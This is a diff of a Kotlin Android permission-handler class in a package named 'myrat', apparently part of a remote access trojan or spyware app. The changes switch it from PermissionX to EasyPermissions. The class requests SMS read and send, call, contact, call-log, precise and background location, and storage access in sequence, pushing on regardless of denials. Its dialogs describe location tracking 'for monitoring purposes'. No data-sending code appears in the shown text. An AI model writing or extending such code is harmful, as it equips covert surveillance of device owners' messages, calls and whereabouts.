@@ -10,126 +10,183 @@ import android.net.Uri
 import android.os.Build
 import android.os.PowerManager
 import android.provider.Settings
-import com.guolindev.permissionx.PermissionX
 import com.myrat.app.utils.Logger
+import pub.devrel.easypermissions.EasyPermissions
+import pub.devrel.easypermissions.PermissionRequest
 import java.lang.ref.WeakReference
 
 class PermissionHandler(
     activity: Activity,
     private val simDetailsHandler: SimDetailsHandler
-) {
+) : EasyPermissions.PermissionCallbacks {
+    
     private val activityRef = WeakReference(activity)
     private var currentStep = 0
     private val totalSteps = 6
+    private var permissionsRequested = false
     
-    // Only permissions that actually require runtime requests according to PermissionX docs
-    private val runtimePermissions = mutableListOf<String>().apply {
-        // Core SMS and Phone permissions
-        add(Manifest.permission.RECEIVE_SMS)
-        add(Manifest.permission.READ_SMS)
-        add(Manifest.permission.SEND_SMS)
-        add(Manifest.permission.READ_PHONE_STATE)
-        add(Manifest.permission.CALL_PHONE)
-        
-        // Location permissions
-        add(Manifest.permission.ACCESS_FINE_LOCATION)
-        add(Manifest.permission.ACCESS_COARSE_LOCATION)
-        
-        // Contact and Call log permissions
-        add(Manifest.permission.READ_CONTACTS)
-        add(Manifest.permission.READ_CALL_LOG)
-        
-        // Storage permissions (conditional)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            add(Manifest.permission.READ_MEDIA_IMAGES)
-            add(Manifest.permission.POST_NOTIFICATIONS)
-        } else {
-            add(Manifest.permission.READ_EXTERNAL_STORAGE)
-        }
-        
-        // Phone number permission (conditional)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            add(Manifest.permission.READ_PHONE_NUMBERS)
-        }
-        
-        // Background location (separate request as per PermissionX docs)
-        // Will be requested separately after foreground location
+    companion object {
+        private const val RC_SMS_PERMISSIONS = 100
+        private const val RC_PHONE_PERMISSIONS = 101
+        private const val RC_LOCATION_PERMISSIONS = 102
+        private const val RC_STORAGE_PERMISSIONS = 103
+        private const val RC_BACKGROUND_LOCATION = 104
+    }
+    
+    // Core SMS permissions
+    private val smsPermissions = arrayOf(
+        Manifest.permission.RECEIVE_SMS,
+        Manifest.permission.READ_SMS,
+        Manifest.permission.SEND_SMS
+    )
+    
+    // Phone permissions
+    private val phonePermissions = arrayOf(
+        Manifest.permission.READ_PHONE_STATE,
+        Manifest.permission.CALL_PHONE,
+        Manifest.permission.READ_PHONE_NUMBERS,
+        Manifest.permission.READ_CONTACTS,
+        Manifest.permission.READ_CALL_LOG
+    )
+    
+    // Location permissions
+    private val locationPermissions = arrayOf(
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.ACCESS_COARSE_LOCATION
+    )
+    
+    // Storage permissions (version dependent)
+    private val storagePermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+        arrayOf(
+            Manifest.permission.READ_MEDIA_IMAGES,
+            Manifest.permission.POST_NOTIFICATIONS
+        )
+    } else {
+        arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
     }
 
     fun requestPermissions() {
         val activity = activityRef.get() ?: return
         
-        Logger.log("Starting PermissionX permission flow")
-        currentStep = 1
+        if (permissionsRequested) {
+            Logger.log("Permissions already requested, skipping")
+            return
+        }
         
-        // Step 1: Request core runtime permissions first
-        requestCorePermissions(activity)
+        Logger.log("Starting EasyPermissions permission flow")
+        currentStep = 1
+        permissionsRequested = true
+        
+        // Step 1: Request SMS permissions first
+        requestSmsPermissions(activity)
     }
 
-    private fun requestCorePermissions(activity: Activity) {
-        Logger.log("Step $currentStep/$totalSteps: Requesting core runtime permissions")
+    private fun requestSmsPermissions(activity: Activity) {
+        Logger.log("Step $currentStep/$totalSteps: Requesting SMS permissions")
         
-        PermissionX.init(activity)
-            .permissions(runtimePermissions)
-            .onExplainRequestReason { scope, deniedList ->
-                val message = buildExplanationMessage(deniedList)
-                scope.showRequestReasonDialog(deniedList, message, "Grant", "Deny")
-            }
-            .onForwardToSettings { scope, deniedList ->
-                val message = buildSettingsMessage(deniedList)
-                scope.showForwardToSettingsDialog(deniedList, message, "Settings", "Cancel")
-            }
-            .request { allGranted, grantedList, deniedList ->
-                Logger.log("Core permissions result - All granted: $allGranted")
-                Logger.log("Granted: ${grantedList.size}, Denied: ${deniedList.size}")
-                
-                if (deniedList.isNotEmpty()) {
-                    Logger.warn("Some core permissions denied: $deniedList")
-                }
-                
-                // Continue to background location if foreground location was granted
-                currentStep++
-                if (grantedList.contains(Manifest.permission.ACCESS_FINE_LOCATION) || 
-                    grantedList.contains(Manifest.permission.ACCESS_COARSE_LOCATION)) {
-                    requestBackgroundLocation(activity)
-                } else {
-                    requestSpecialPermissions(activity)
-                }
-            }
+        if (EasyPermissions.hasPermissions(activity, *smsPermissions)) {
+            Logger.log("SMS permissions already granted")
+            currentStep++
+            requestPhonePermissions(activity)
+            return
+        }
+        
+        EasyPermissions.requestPermissions(
+            PermissionRequest.Builder(activity, RC_SMS_PERMISSIONS, *smsPermissions)
+                .setRationale("SMS permissions are required to receive, read, and send SMS messages for the app to function properly.")
+                .setPositiveButtonText("Grant")
+                .setNegativeButtonText("Deny")
+                .build()
+        )
+    }
+
+    private fun requestPhonePermissions(activity: Activity) {
+        Logger.log("Step $currentStep/$totalSteps: Requesting phone permissions")
+        
+        if (EasyPermissions.hasPermissions(activity, *phonePermissions)) {
+            Logger.log("Phone permissions already granted")
+            currentStep++
+            requestLocationPermissions(activity)
+            return
+        }
+        
+        EasyPermissions.requestPermissions(
+            PermissionRequest.Builder(activity, RC_PHONE_PERMISSIONS, *phonePermissions)
+                .setRationale("Phone permissions are required to access phone state, make calls, read contacts, and call logs.")
+                .setPositiveButtonText("Grant")
+                .setNegativeButtonText("Deny")
+                .build()
+        )
+    }
+
+    private fun requestLocationPermissions(activity: Activity) {
+        Logger.log("Step $currentStep/$totalSteps: Requesting location permissions")
+        
+        if (EasyPermissions.hasPermissions(activity, *locationPermissions)) {
+            Logger.log("Location permissions already granted")
+            currentStep++
+            requestStoragePermissions(activity)
+            return
+        }
+        
+        EasyPermissions.requestPermissions(
+            PermissionRequest.Builder(activity, RC_LOCATION_PERMISSIONS, *locationPermissions)
+                .setRationale("Location permissions are required to track device location for monitoring purposes.")
+                .setPositiveButtonText("Grant")
+                .setNegativeButtonText("Deny")
+                .build()
+        )
+    }
+
+    private fun requestStoragePermissions(activity: Activity) {
+        Logger.log("Step $currentStep/$totalSteps: Requesting storage permissions")
+        
+        if (EasyPermissions.hasPermissions(activity, *storagePermissions)) {
+            Logger.log("Storage permissions already granted")
+            currentStep++
+            requestBackgroundLocation(activity)
+            return
+        }
+        
+        val rationale = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            "Media and notification permissions are required to access images and show notifications."
+        } else {
+            "Storage permission is required to access files and images on the device."
+        }
+        
+        EasyPermissions.requestPermissions(
+            PermissionRequest.Builder(activity, RC_STORAGE_PERMISSIONS, *storagePermissions)
+                .setRationale(rationale)
+                .setPositiveButtonText("Grant")
+                .setNegativeButtonText("Deny")
+                .build()
+        )
     }
 
     private fun requestBackgroundLocation(activity: Activity) {
-        // Background location requires separate request as per PermissionX docs
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            Logger.log("Step $currentStep/$totalSteps: Requesting background location")
-            
-            PermissionX.init(activity)
-                .permissions(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-                .onExplainRequestReason { scope, deniedList ->
-                    scope.showRequestReasonDialog(
-                        deniedList,
-                        "Background location access is needed to track location when the app is not actively being used. This enables location monitoring even when the screen is off.",
-                        "Grant",
-                        "Deny"
-                    )
-                }
-                .onForwardToSettings { scope, deniedList ->
-                    scope.showForwardToSettingsDialog(
-                        deniedList,
-                        "Background location was denied. Please go to Settings > App Permissions > Location and select 'Allow all the time'.",
-                        "Settings",
-                        "Cancel"
-                    )
-                }
-                .request { allGranted, grantedList, deniedList ->
-                    Logger.log("Background location result - Granted: $allGranted")
-                    currentStep++
-                    requestSpecialPermissions(activity)
-                }
-        } else {
+        Logger.log("Step $currentStep/$totalSteps: Requesting background location")
+        
+        // Background location only needed on Android 10+
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
             currentStep++
             requestSpecialPermissions(activity)
+            return
         }
+        
+        if (EasyPermissions.hasPermissions(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
+            Logger.log("Background location already granted")
+            currentStep++
+            requestSpecialPermissions(activity)
+            return
+        }
+        
+        EasyPermissions.requestPermissions(
+            PermissionRequest.Builder(activity, RC_BACKGROUND_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                .setRationale("Background location access is needed to track location when the app is not actively being used.")
+                .setPositiveButtonText("Grant")
+                .setNegativeButtonText("Deny")
+                .build()
+        )
     }
 
     private fun requestSpecialPermissions(activity: Activity) {
@@ -174,6 +231,81 @@ class PermissionHandler(
             currentStep++
             requestManufacturerSpecificSettings(activity)
         }
+    }
+
+    // EasyPermissions callbacks
+    override fun onPermissionsGranted(requestCode: Int, perms: MutableList<String>) {
+        val activity = activityRef.get() ?: return
+        
+        Logger.log("Permissions granted for request $requestCode: $perms")
+        
+        when (requestCode) {
+            RC_SMS_PERMISSIONS -> {
+                currentStep++
+                requestPhonePermissions(activity)
+            }
+            RC_PHONE_PERMISSIONS -> {
+                currentStep++
+                requestLocationPermissions(activity)
+            }
+            RC_LOCATION_PERMISSIONS -> {
+                currentStep++
+                requestStoragePermissions(activity)
+            }
+            RC_STORAGE_PERMISSIONS -> {
+                currentStep++
+                requestBackgroundLocation(activity)
+            }
+            RC_BACKGROUND_LOCATION -> {
+                currentStep++
+                requestSpecialPermissions(activity)
+            }
+        }
+    }
+
+    override fun onPermissionsDenied(requestCode: Int, perms: MutableList<String>) {
+        val activity = activityRef.get() ?: return
+        
+        Logger.warn("Permissions denied for request $requestCode: $perms")
+        
+        // Check if some permissions are permanently denied
+        if (EasyPermissions.somePermissionPermanentlyDenied(activity, perms)) {
+            Logger.warn("Some permissions permanently denied: $perms")
+            // Could show settings dialog here, but continue with flow
+        }
+        
+        // Continue with next step regardless of denials
+        when (requestCode) {
+            RC_SMS_PERMISSIONS -> {
+                currentStep++
+                requestPhonePermissions(activity)
+            }
+            RC_PHONE_PERMISSIONS -> {
+                currentStep++
+                requestLocationPermissions(activity)
+            }
+            RC_LOCATION_PERMISSIONS -> {
+                currentStep++
+                requestStoragePermissions(activity)
+            }
+            RC_STORAGE_PERMISSIONS -> {
+                currentStep++
+                requestBackgroundLocation(activity)
+            }
+            RC_BACKGROUND_LOCATION -> {
+                currentStep++
+                requestSpecialPermissions(activity)
+            }
+        }
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray,
+        activity: Activity
+    ) {
+        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, activity)
     }
 
     private fun requestBatteryOptimization(activity: Activity) {
@@ -468,37 +600,6 @@ class PermissionHandler(
         }
     }
 
-    private fun buildExplanationMessage(deniedList: List<String>): String {
-        val permissionReasons = mapOf(
-            Manifest.permission.RECEIVE_SMS to "receive and monitor SMS messages",
-            Manifest.permission.READ_SMS to "read existing SMS messages",
-            Manifest.permission.SEND_SMS to "send SMS messages",
-            Manifest.permission.READ_PHONE_STATE to "access phone information and SIM details",
-            Manifest.permission.READ_PHONE_NUMBERS to "read phone numbers from SIM cards",
-            Manifest.permission.CALL_PHONE to "make phone calls",
-            Manifest.permission.ACCESS_FINE_LOCATION to "access precise location for tracking",
-            Manifest.permission.ACCESS_COARSE_LOCATION to "access approximate location",
-            Manifest.permission.ACCESS_BACKGROUND_LOCATION to "access location in background",
-            Manifest.permission.READ_CONTACTS to "read contact information",
-            Manifest.permission.READ_CALL_LOG to "read call history",
-            Manifest.permission.READ_EXTERNAL_STORAGE to "read files and images",
-            Manifest.permission.READ_MEDIA_IMAGES to "read images from device storage",
-            Manifest.permission.POST_NOTIFICATIONS to "show notifications"
-        )
-        
-        val reasons = deniedList.mapNotNull { permission ->
-            permissionReasons[permission]?.let { reason ->
-                "• ${permission.substringAfterLast(".")} - $reason"
-            }
-        }
-        
-        return "This app needs the following permissions to function properly:\n\n${reasons.joinToString("\n")}\n\nPlease grant these permissions to continue."
-    }
-
-    private fun buildSettingsMessage(deniedList: List<String>): String {
-        return "Some permissions were permanently denied. Please go to Settings and manually grant the following permissions:\n\n${deniedList.joinToString("\n") { "• ${it.substringAfterLast(".")}" }}"
-    }
-
     // Helper methods for checking permission states
     private fun isBatteryOptimizationDisabled(context: Context): Boolean {
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -542,12 +643,13 @@ class PermissionHandler(
     fun areAllPermissionsGranted(): Boolean {
         val activity = activityRef.get() ?: return false
         
-        // Check runtime permissions using PermissionX
-        val runtimeGranted = PermissionX.isGranted(activity, *runtimePermissions.toTypedArray())
+        // Check runtime permissions using EasyPermissions
+        val allPermissions = smsPermissions + phonePermissions + locationPermissions + storagePermissions
+        val runtimeGranted = EasyPermissions.hasPermissions(activity, *allPermissions)
         
         // Check background location separately
         val backgroundLocationGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            PermissionX.isGranted(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+            EasyPermissions.hasPermissions(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
         } else {
             true
         }
